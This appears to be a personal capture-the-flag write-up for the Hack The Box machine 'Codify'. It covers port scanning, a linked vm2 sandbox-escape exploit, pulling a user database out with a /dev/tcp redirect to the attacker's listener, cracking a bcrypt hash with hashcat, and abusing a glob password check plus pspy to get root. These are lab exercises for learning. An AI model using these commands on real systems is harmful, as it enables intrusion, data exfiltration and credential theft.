# Codify Box

## Enumeration
So I ran `sudo nmap -Pn -sC -sV 10.10.11.239` to start out.

This returned that ports 22, 80, and 3000 as well as some other filtered ports.

When I connect to 10.10.11.239:80 it resolves to http://codify.htb/. So we can add that to etc hosts.

Like 10.10.11.239 codify.htb. Easy code for this:
`echo '10.10.11.239 codify.htb' | sudo tee -a /etc/hosts`

We see this page allows us to rest Node.js code.

## Foothold

This tool uses vm2 for sandboxing. I know the information on this box says we need to do CVE research. Seems a good place to start.

Quick google search finds (this)[https://nvd.nist.gov/vuln/detail/CVE-2023-37466].

The CVE mentions that versions up to 3.9.19 are vulnerable to remote code execution and the link they provide on the about us page is 3.9.16. So my guess this is where I start.

Little research finds (this)[https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac] working code example.

Now I have remote code execution. So now I just need to find the user.txt and root.txt

## Finding the flags

To get the flags for this one I ended up having to use the walk through. I knew to check the /etc/passwd file but I wasn't sure what I was looking for. The trick here was to see the joshua user.

Then we had to go through and find the /var/www/contacts directory. In it there was a tickets.db file. This is a SQLite database.

Then we have to transfer this db to our local machine so we can see its contents.

We can do something like `nc -lnvp 2222 > tickets.db` then we can do
`cat tickets.db > /dev/tcp/10.10.14.99/2222`

The /dev/tcp/IP/PORT portion is a trick in Bash that tells the PC to create a connection to that IP. This does not work in zsh. So I had to do this on this first.

`script /dev/null -c bash`

This started a bash terminal instead.

Once we got it on the local machine we can run sqlite3 tickets.db

Use the .tables command to list the tables.

Then we see a users table. So we can do:
`SELECT * FROM users;`

This returns a password that has been hashed.

This was where I ran into a wall because I had not used hashcat before. But we had to do was run:

`hashcat --force -m 3200 hash.txt /usr/share/wordlists/rockyou.txt`

We know that -m is the one to use because the first 4 letters of that hash were $2a$ which indicates this is a bcrypt hash.

And we can look up hashcat for a list of which hashes have which flags.

This returns the users password.

So now we can ssh onto the box with joshua and the password.

And this gets us the user flag. But then we need to get the root.

If we run `sudo -l` we can see what commands joshua has access to.

There is a file called /opt/scripts/mysql-backup.sh that he can run, when it runs it asks for a password for a sql database.

If we look at the bash code we see that there are two major flaws with the script. The first thing is that it does a comparison like [[ $DB_PASS == $USER_PASS ]]. This does a regex pattern matching to test. So if we pass in * as our password it works as being correct. 

Next we see that the password being used to access the actual database is not the user provided password, but the real password. So if we pass in the password as * the script will work as expected.

And if we use pspy, we can get the actual password being passed in.

To do this we need to get pspy in a directory. Then start hosting a server in that same directory like:
`wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s`
`python3 -m http.server 8082`

Then we can put pspy on the ssh box by running:
`wget http://10.10.14.99:8082/pspy64s`

Then we need to open a new ssh into the box again. Set pspy as an executable. And run it.
`chmod +x pspy64s`
`./pspy64s`

Then on our original ssh session we can just run the command again.

If we then look at the pspy output we see the password for the root user.

Then we can just run:
`su root` and put in that password.
Then run:
`cd /root/` and we see the flag.

